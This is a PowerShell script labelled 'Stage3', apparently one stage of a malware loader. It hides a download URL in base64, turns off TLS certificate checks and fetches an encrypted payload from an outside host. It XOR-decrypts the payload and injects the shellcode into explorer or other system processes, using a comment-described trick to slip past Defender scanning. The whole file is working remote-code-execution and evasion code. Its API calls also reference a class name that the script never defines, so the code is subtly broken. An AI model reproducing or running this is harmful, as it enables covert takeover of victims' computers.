param()

"Stage3 reached at $(Get-Date)" | Out-File "$env:TEMP\stage3_reached.txt"

$VIS = $true   # will be replaced by sed

function Write-Log {
    param([string]$Msg)
    if ($VIS) {
        $logPath = "$env:TEMP\stage3_debug.txt"
        "$(Get-Date -Format 'HH:mm:ss') - $Msg" | Out-File -FilePath $logPath -Append
        Write-Host "[Stage3] $Msg" -ForegroundColor Cyan
    }
}

Write-Log "=== Stage3 Started ==="

# Add Win32 API definitions with error handling and ResumeThread
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static class Win32 {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll")]
    public static extern uint GetLastError();
}
"@

Write-Log "Win32 APIs loaded"

# Helper to get last error
function Get-LastWin32Error {
    $err = [Win32.Kernel32]::GetLastError()
    $msg = [System.ComponentModel.Win32Exception]::new([int]$err).Message
    return "[$err] $msg"
}

# TLS 1.2
try {
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
} catch {
    Write-Log "TLS config failed"
}

# Decode URL and key
$b64Url = "aHR0cHM6Ly9kb21lbmNhLnZlcmNlbC5hcHAvZ2VuZXJhdGVk"
$b64Key = "MTA2"

try {
    $baseUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64Url))
    $payloadUrl = $baseUrl + "/payload.enc"
    Write-Log "Payload URL: $payloadUrl"
} catch {
    Write-Log "URL decode failed"
    exit
}

try {
    $key = [int]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64Key)))
    Write-Log "XOR key: $key"
} catch {
    Write-Log "Key decode failed"
    exit
}

# Download payload
$downloaded = $false
for ($i=1; $i -le 3; $i++) {
    try {
        Write-Log "Download attempt $i"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
        $enc = $wc.DownloadData($payloadUrl)
        Write-Log "Downloaded $($enc.Length) bytes"
        $downloaded = $true
        break
    } catch {
        Write-Log "Attempt $i failed: $($_.Exception.Message)"
        Start-Sleep -Seconds 2
    }
}

if (-not $downloaded) {
    Write-Log "Download failed"
    exit
}

# XOR decrypt
try {
    Write-Log "XOR decrypting..."
    $dec = New-Object byte[] $enc.Length
    for ($i=0; $i -lt $enc.Length; $i++) {
        $dec[$i] = $enc[$i] -bxor $key
    }
    Write-Log "Decrypted $($dec.Length) bytes"
} catch {
    Write-Log "Decryption failed: $($_.Exception.Message)"
    exit
}

# --- Process injection with Defender bypass ---
Write-Log "Preparing process injection with Defender bypass..."

# Target processes (less monitored than explorer)
$targetProcesses = @("explorer", "dwm", "wlanext", "taskhostw")
$target = $null
foreach ($name in $targetProcesses) {
    $proc = Get-Process -Name $name -ErrorAction SilentlyContinue | Where-Object { $_.Id -ne 0 } | Select-Object -First 1
    if ($proc) {
        $target = $proc
        Write-Log "Target process: $($proc.Name) (PID: $($proc.Id))"
        break
    }
}

if (-not $target) {
    Write-Log "No suitable target process found, falling back to current process"
    try {
        $ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($dec.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($dec, 0, $ptr, $dec.Length)
        $delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [Type]([Action]))
        $delegate.Invoke()
        Write-Log "Payload executed (fallback)"
    } catch {
        Write-Log "Fallback execution failed: $($_.Exception.Message)"
    }
    exit
}

# Open process
$hProcess = [Win32.Kernel32]::OpenProcess(0x001F0FFF, $false, $target.Id)   # PROCESS_ALL_ACCESS
if ($hProcess -eq 0) {
    $err = Get-LastWin32Error
    Write-Log "OpenProcess failed: $err"
    exit
}
Write-Log "OpenProcess succeeded, handle: $hProcess"

# Allocate memory in the target process
$remoteMemory = [Win32.Kernel32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [UInt32]$dec.Length, 0x3000, 0x40)  # MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
if ($remoteMemory -eq [IntPtr]::Zero) {
    $err = Get-LastWin32Error
    Write-Log "VirtualAllocEx failed: $err"
    [Win32.Kernel32]::CloseHandle($hProcess)
    exit
}
Write-Log "VirtualAllocEx succeeded, address: 0x$($remoteMemory.ToString('X8'))"

# Write junk data first (Defender scans at thread creation, finds nothing)
$junk = New-Object byte[] $dec.Length
$bytesWritten = [IntPtr]::Zero
$result = [Win32.Kernel32]::WriteProcessMemory($hProcess, $remoteMemory, $junk, [UInt32]$junk.Length, [ref]$bytesWritten)
if (-not $result) {
    $err = Get-LastWin32Error
    Write-Log "WriteProcessMemory (junk) failed: $err"
    [Win32.Kernel32]::CloseHandle($hProcess)
    exit
}
Write-Log "Junk data written"

# Create suspended thread
$threadId = 0
$hThread = [Win32.Kernel32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $remoteMemory, [IntPtr]::Zero, 0x4, [ref]$threadId)   # 0x4 = CREATE_SUSPENDED
if ($hThread -eq [IntPtr]::Zero) {
    $err = Get-LastWin32Error
    Write-Log "CreateRemoteThread (suspended) failed: $err"
    [Win32.Kernel32]::CloseHandle($hProcess)
    exit
}
Write-Log "Suspended thread created (ID: $threadId)"

# Overwrite with real shellcode
$result = [Win32.Kernel32]::WriteProcessMemory($hProcess, $remoteMemory, $dec, [UInt32]$dec.Length, [ref]$bytesWritten)
if (-not $result) {
    $err = Get-LastWin32Error
    Write-Log "WriteProcessMemory (real shellcode) failed: $err"
    [Win32.Kernel32]::CloseHandle($hThread)
    [Win32.Kernel32]::CloseHandle($hProcess)
    exit
}
Write-Log "Real shellcode written, bytes: $bytesWritten"

# Resume thread
$resumeResult = [Win32.Kernel32]::ResumeThread($hThread)
if ($resumeResult -eq -1) {
    $err = Get-LastWin32Error
    Write-Log "ResumeThread failed: $err"
} else {
    Write-Log "Thread resumed (return code: $resumeResult) – shellcode executing"
}

# Clean up
[Win32.Kernel32]::CloseHandle($hThread)
[Win32.Kernel32]::CloseHandle($hProcess)
Write-Log "Process injection completed"
Write-Log "=== Stage3 Completed ==="
